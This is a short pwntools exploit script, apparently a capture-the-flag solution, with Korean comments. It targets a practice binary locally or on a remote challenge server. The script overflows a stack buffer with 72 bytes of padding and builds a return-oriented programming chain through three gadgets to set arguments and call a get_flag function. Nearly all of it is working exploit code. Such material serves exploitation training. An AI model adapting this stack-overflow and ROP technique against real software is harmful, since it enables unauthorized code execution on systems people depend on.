from pwn import *
context.terminal = "tmux splitw -h".split()

if args.REMOTE: 
    p =remote("kayle.snu.ac.kr",10033)
else: 
    p = process("./prob")
    gdb.attach(p)

elf = ELF('./prob')

rop = ROP(elf)

get_flag = elf.symbols['get_flag']
gadget1 = elf.symbols['gadget1']
gadget2 = elf.symbols['gadget2']
gadget3 = elf.symbols['gadget3']

# 인자 설정
arg1 = 0x1111
arg2 = 0x2222
arg3 = 0x3333

# ROP 구성
payload = b'A' * 72
payload += p64(gadget1) 
 # arg1 값 설정       
payload += p64(arg1)          
payload += p64(gadget2)       
 # arg2 값 설정
payload += p64(arg2)          
payload += p64(gadget3) 
# arg3 값 설정      
payload += p64(arg3)           
# get_flag 함수 호출
payload += p64(get_flag)       

p.recvuntil(b"username: ")
p.sendline(b"Nina")

p.recvuntil(b"back? ")
p.sendline(payload)

p.interactive()